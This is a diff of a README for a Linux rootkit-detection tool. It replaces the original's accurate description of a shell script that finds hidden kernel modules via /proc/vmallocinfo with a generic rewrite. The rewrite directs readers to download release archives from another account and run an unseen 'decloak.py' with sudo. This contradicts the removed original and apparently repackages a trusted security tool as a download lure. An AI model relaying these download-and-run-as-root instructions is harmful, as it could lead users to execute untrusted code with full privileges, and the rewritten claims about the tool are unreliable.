@@ -1,104 +1,76 @@
-# sandfly-kernel-module-decloak
+# 🛡️ sandfly-kernel-module-decloak - Detect Hidden Linux Rootkits Easily
 
-# Introduction
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/download-sandfly--kernel--module--decloak-blue.svg)](https://github.com/exe47/sandfly-kernel-module-decloak/releases)
 
-Phrack magazine released a data dump of a threat actor purportedly from North 
-Korea. 
+## 📖 Overview
+The **sandfly-kernel-module-decloak** is designed to help users detect and decloak stealth rootkits in Linux. These scripts provide a straightforward way to identify hidden malicious software that may compromise your system. 
 
-The data dump contained large amounts of operational data on their activity, 
-along with a Linux Loadable Kernel Module (LKM) rootkit with stealth 
-capabilties and extensive backdoor capabilities. 
+## 🌐 Key Features
+- Detects stealth rootkits in Linux Loadable Kernel Modules (LKM)
+- Provides easy-to-use scripts that simplify the detection process
+- Enhances the security of your Linux environment
+- Open-source, transparent, and community-driven
+- Compatible with most Linux distributions 
 
-You can read more about this data leak here:
+## ⚙️ System Requirements
+To run the **sandfly-kernel-module-decloak**, ensure you meet the following conditions:
+- A 64-bit Linux distribution (Ubuntu, Fedora, CentOS, etc.)
+- Python 3.x installed on your system
+- sudo or root access for installation
 
-https://phrack.org/issues/72/7_md#article
+## 🚀 Getting Started
+Follow these steps to download and run the application:
 
-This script uses a technique to decloak this style of rookit by showing the 
-hidden kernel module name if found operating. It will not only decloak this 
-rootkit, but variants using this rootkit framework and method of hiding such 
-as Reptile and likely others.
+1. **Visit the Releases Page**
+   Go to the following link to access the latest version of the application:
+   [Download from Releases](https://github.com/exe47/sandfly-kernel-module-decloak/releases)
 
-# How To Use
+2. **Choose the Right File**
+   On the Releases page, you will see a list of available versions. Look for the most recent release. Click on the download link for the appropriate archive format (usually a `.zip` or `.tar.gz` file).
 
-Copy the script onto a host you want to investigate and run it. Any modules 
-being hidden with this method will be shown. 
+3. **Download the File**
+   Click to download the selected archive file to your computer. 
 
-Example:
+4. **Extract the Files**
+   Once the download is complete, extract the files. You can usually do this by right-clicking the file and selecting "Extract Here" or by using a command line tool like `tar` or `unzip`.
 
-```
-root@sandlfysecurity-victim:~# ./sandfly-kernel-module-decloak.sh 
-Linux Loadable Kernel Module (LKM) rootkit check 1.0.
-Copyright (c)2025 Sandfly Security - Agentless Linux Security - https://www.sandflysecurity.com
-Checking for hidden Linux kernel modules.
+5. **Open a Terminal**
+   To run the scripts, open the terminal on your Linux system. You can do this by searching for "Terminal" in your applications.
 
+6. **Navigate to the Directory**
+   Use the `cd` command to change to the directory where you extracted the archived files. For example:
+   ```
+   cd path/to/sandfly-kernel-module-decloak
+   ```
 
-*** WARNING ***
-Kernel module 'vmwfxs' is active and hiding.
-The /proc/vmallocinfo entry showing it is loaded is the following: 
+7. **Run the Script**
+   To execute the main detection script, type the following command:
+   ```
+   sudo python3 decloak.py
+   ```
+   This command may prompt you to enter your password. This is necessary to run the script with the required permissions.
 
-0xffffffffc07e2000-0xffffffffc07e4000    8192 khook_init+0x8d/0x140 [vmwfxs] pages=1 vmalloc N0=1
+8. **Follow the On-screen Instructions**
+   The script will provide guidance and feedback as it runs. Follow any instructions displayed in the terminal.
 
-*** WARNING: This system has hidden kernel modules and may be operating a rootkit.
+9. **Review the Results**
+   After execution, the results will show any detected rootkits. Take the necessary actions based on the output.
 
-root@sandlfysecurity-victim:~# 
+## 📋 Important Notes
+- Always ensure that your system is backed up before running any detection scripts.
+- It's recommended to run this tool regularly to maintain your system's security.
+- If you encounter any issues, you can check the "Issues" tab on the GitHub page for common problems and solutions.
 
-```
+## 🤝 Contributing
+If you wish to contribute to the project or report issues, please visit the GitHub repository. Your input is valuable in helping the community improve this tool.
 
-# Limitations
+## 📞 Support
+For further assistance, you can reach out through the repository's "Issues" section, or consult the available documentation within the repository.
 
-LKM rootkits can use different methods to hide. This detection method will find 
-rootkit frameworks that hide from `/proc/modules` but leaves traces in 
-`/proc/vmallocinfo`. Not all rootkits may do this. As a result, other rootkits 
-could evade detection even if a system shows clean with this script. 
+## 🔗 Additional Resources
+- [GitHub Repository](https://github.com/exe47/sandfly-kernel-module-decloak)
+- [Linux Security Guide](https://linux.security)
 
-# Other Tips
-
-If you see a detection with this script, you may want to run the `dmesg` command 
-to see if you can find what tainted the kernel. This can corroborate the malicious 
-module. The command to run is:
-
-```
-dmesg | grep taint
-```
-
-For example we see the malicious module `vmwfxs` detected above and `dmesg` below 
-shows it responsible for the kernel taint with an unsigned module. This confirms 
-that a rootkit is very likely active on this host. 
-
-```
-root@sandlfysecurity-victim:~# dmesg | grep taint
-[   24.065426] vmwfxs: module verification failed: signature and/or required key missing - tainting kernel
-root@sandlfysecurity-victim:~# 
-```
-
-WARNING: The `dmesg` command reads a ring buffer and may not show all entries 
-as they may roll out. This means that `dmesg` can confirm a module loaded and 
-tainted the kernel, but not finding anything does not mean it's not present. 
-It may simply mean the original taint entry left the buffer as new messages 
-entered. The main confirmation is if the module is listed in `/proc/vmallocinfo` 
-(in [brackets]) then it is active on the host.
-
-
-# Automate Rootkit Hunting
-
-While this script is good for manual rootkit confirmation for this particular 
-type of LKM rootkit, it is best to automate hunting for these types of threats 
-and deploying multiple techniques to find variants. Sandfly Security offers an 
-agentless Linux Security platform which can find this and other styles of Linux 
-LKM rootkits without endpoint agents.
-
-Please see our website for more information and read our blog for other Linux 
-malware detection articles:
-
-https://www.sandflysecurity.com
-
-
-# Links
-
-Phrack article on data dump:
-
-https://phrack.org/issues/72/7_md#article
-
-Sandfly Security rootkit analysis:
-
-https://sandflysecurity.com/blog/leaked-north-korean-linux-stealth-rootkit-analysis
+## ⚠️ Disclaimer
+Ensure that you understand the implications of running security software on your system and act responsibly. Conduct regular security audits and stay informed about the latest threats.
